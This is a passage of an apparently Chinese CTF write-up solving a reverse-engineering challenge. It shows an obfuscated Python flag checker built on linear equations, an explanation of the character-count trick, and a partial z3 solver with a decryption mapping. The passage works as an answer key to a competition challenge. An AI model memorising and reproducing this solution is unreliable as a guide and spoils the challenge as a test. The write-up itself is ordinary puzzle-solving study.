class="number">5847</span>,</span><br><span class="line">         <span class="number">24</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">67</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">146</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">50</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">27</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">45</span> * i11i1Iii1I1[<span class="number">15</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">17</span> * i11i1Iii1I1[<span class="number">17</span>] == <span class="number">18257</span>,</span><br><span class="line">         <span class="number">25</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">89</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">19</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">150</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">250</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">166</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">126</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">690</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">207</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">18</span>] == <span class="number">12591</span>,</span><br><span class="line">         <span class="number">5</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">8</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">160</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">690</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">19</span> * i11i1Iii1I1[<span class="number">19</span>] == <span class="number">52041</span>,</span><br><span class="line">         <span class="number">29</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">60</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">21</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">19</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">20</span>] == <span class="number">20253</span>,</span><br><span class="line">         <span class="number">45</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">650</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">900</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">21</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">406</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">651</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] == <span class="number">18768</span>,</span><br><span class="line">         <span class="number">555</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">6666</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">70</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">510</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">90</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">499</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] - <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">610</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">221</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">23</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">102</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2050</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">406</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">665</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">201</span> * i11i1Iii1I1[<span class="number">21</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">22</span>] == <span class="number">111844</span>,</span><br><span class="line">         <span class="number">1</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4444</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">5555</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">676</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">660</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">73</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">107</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">201</span> * i11i1Iii1I1[<span class="number">21</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] == <span class="number">159029</span>,</span><br><span class="line">         <span class="number">520</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">222</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56655</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">73</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">1007</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">7777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2500</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">605</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">390</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">99999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">210</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] == <span class="number">2762025</span>,</span><br><span class="line">         <span class="number">1323</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">660</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2500</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">605</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">390</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">9999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">210</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] == <span class="number">1551621</span>,</span><br><span class="line">         <span class="number">777</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">6969</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>] == <span class="number">948348</span>,</span><br><span class="line">         <span class="number">97</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">6969</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">-9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">-2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>] + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] == <span class="number">777044</span>,</span><br><span class="line">         <span class="number">177</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">699</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">64</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">96</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">-9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">-2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">222</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">224</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>] + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] - <span class="number">28</span> * i11i1Iii1I1[<span class="number">28</span>] == <span class="number">185016</span>,</span><br><span class="line">         <span class="number">77</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">96</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">9</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">-9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">-2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">222</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">224</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">-58</span> * i11i1Iii1I1[<span class="number">26</span>] + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">28</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">29</span>] == <span class="number">130106</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(ii1iIi1i11i):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Congratulation!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;wrong_wrong!!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>是计下 flag 里面每个字符出现的次数检验是否符合那个字符串的格式化的对应次数，</p><p>将下面的 z3 解出可以得到一个字符串 <strong>H1Z1N1U1C1T1F1{1a6d275f7-463}</strong></p><p>一个字符一个数字配对，代表该字符在原 flag 中出现的次数。</p><p>除去前面 HZNUCTF{，将括号内的字母和对应数字做映射，利用原代码中的**”111111116257645365477364777645752361”**去一一对应。</p><p>解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">_encrypted_</span>):</span><br><span class="line">    mapping = <span class="string">&quot;6257645365477364777645752361&quot;</span></span><br><span class="line">    </span><br><span class="line">    char_map = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    remaining_map = &#123;</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    char_map.update(remaining_map)</span><br><span class="line">    </span><br><span class="line">    result = <span class="string">&quot;HZNUCTF&#123;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> mapping:</span><br><span class="line">        result += char_map[num]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">Enc = [Int(<span class="string">f&#x27;x<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>)]</span><br><span class="line"></span><br><span class="line">s.add(<span class="number">7</span> * Enc[<span class="number">0</span>] == <span class="number">504</span>)</span><br><span class="line">s.add(<span class="number">9</span> * Enc[<span class="number">0</span>] - <span class="number">5</span> * Enc[<span class="number">1</span>] == <span class="number">403</span>)</span><br><span class="line">s.add((<span class="number">2</span> * Enc[<span class="number">0</span>] - <span class="number">5</span> * Enc[<span class="number">1</span>]) + <span class="number">10</span> * Enc[<span class="number">2</span>] == <span class="number">799</span>)</span><br><span class="line">s.add(<span class="number">3</span> * Enc[<span class="number">0</span>] + <span class="number">8</span> * Enc[<span class="number">1</span>] + <span class="number">15</span> * Enc[<span class="number">2</span>] + <span class="number">20</span> * Enc[<span class="number">3</span>] == <span class="number">2938</span>)</span><br><span class="line">s.add((<span class="number">5</span> * Enc[<span class="number">0</span>] + <span class="number">15</span> * Enc[<span class="number">1</span>] + <span class="number">20</span> * Enc[<span class="number">2</span>] - <span class="number">19</span> * Enc[<span class="number">3</span>]) + <span class="number">1</span> * Enc[<span class="number">4</span>] == <span class="number">2042</span>)</span><br><span class="line">s.add((<span class="number">7</span> * Enc[<span class="number">0</span>] + <span class="number">1</span> * Enc[<span class="number">1</span>] + <span class="number">9</span> * Enc[<span class="number">2</span>] - <span class="number">11</span> * Enc[<span class="number">3</span>]) + <span class="number">2</span> * Enc[<span class="number">4</span>] + <span class="number">5</span> * Enc[<span class="number">5</span>] == <span class="number">1225</span>)</span><br><span class="line">s.add(<span class="number">11</span> * Enc[<span class="number">0</span>] + <span class="number">22</span> * Enc[<span class="number">1</span>] + <span class="number">33</span> * Enc[<span class="number">2</span>] + <span class="number">44</span> * Enc[<span class="number">3</span>] + <span class="number">55</span> * Enc[<span class="number">4</span>] + <span class="number">66</span> * Enc[<span class="number">5</span>] - <span class="number">77</span> * Enc[<span class="number">6</span>] == <span class="number">7975</span>)</span><br><span class="line">s.add(((<span class="number">21</span> * Enc[<span class="number">0</span>] + <span class="number">23</span> * Enc[<span class="number">1</span>] + <span class="number">3</span> * Enc[<span class="number">2</span>] + <span class="number">24</span> * Enc[<span class="number">3</span>] - <span class="number">55</span> * Enc[<span class="number">4</span>]) + <span class="number">6</span> * Enc[<span class="number">5</span>] - <span class="number">7</span> * Enc[<span class="number">6</span>]) + <span class="number">15</span> * Enc[<span class="number">7</span>] == <span class="number">229</span>)</span><br><span class="line">s.add((<span class="number">2</span> * Enc[<span class="number">0</span>] + <span class="number">26</span> * Enc[<span class="number">1</span>] + <span class="number">13</span> * Enc[<span class="number">2</span>] + <span class="number">0</span> * Enc[<span class="number">3</span>] - <span class="number">65</span> * Enc[<span class="number">4</span>]) + <span class="number">15</span> * Enc[<span class="number">5</span>] + <span class="number">29</span> * Enc[<span class="number">6</span>] + <span class="number">1</span> * Enc[<span class="number">7</span>] + <span class="number">20</span> * Enc[<span class="number">8</span>] == <span class="number">2107</span>)</span><br><span class="line">s.add((<span class="number">10</span> * Enc[<span class="number">0</span>] + <span class="number">7</span> * Enc[<span class="number">1</span>] + -<span class="number">9</span> * Enc[<span class="number">2</span>] + <span class="number">6</span> * Enc[<span class="number">3</span>] + <span class="number">7</span> * Enc[<span class="number">4</span>] + <span class="number">1</span> * Enc[<span class="number">5</span>] + <span class="number">22</span> * Enc[<span class="number">6</span>] + <span class="number">21</span> * Enc[<span class="number">7</span>] - <span class="number">22</span> * Enc[<span class="number">8</span>]) + <span class="number">30</span> * Enc[<span class="number">9</span>] == <span class="number">4037</span>)</span><br><span class="line">s.add((<span class="number">15</span> * Enc[<span class="number">0</span>] + <span class="number">59</span> * Enc[<span class="number">1</span>] + <span class="number">56</span> * Enc[<span class="number">2</span>] + <span class="number">66</span> * Enc[<span class="number">3</span>] + <span class="number">7</span> * Enc[<span class="number">4</span>] 